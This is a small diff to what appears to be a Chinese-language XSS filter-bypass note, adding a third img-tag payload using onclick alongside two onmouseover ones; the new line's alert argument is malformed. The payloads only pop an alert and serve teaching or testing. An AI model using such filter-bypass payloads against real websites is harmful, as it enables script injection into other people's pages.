@@ -114,6 +114,7 @@ HTML 语言中对引号的使用不敏感，可以通过引号绕过过滤器。
 ~~~html
 <Img/sRc='#'/onmouseover	='alert(/XSS/)'>
 <img/scr='#'/onmouseover='alert(/XSS/)'>
+<img/scr="#"/onclick='alert(/XSS)'>
 ~~~
 
 
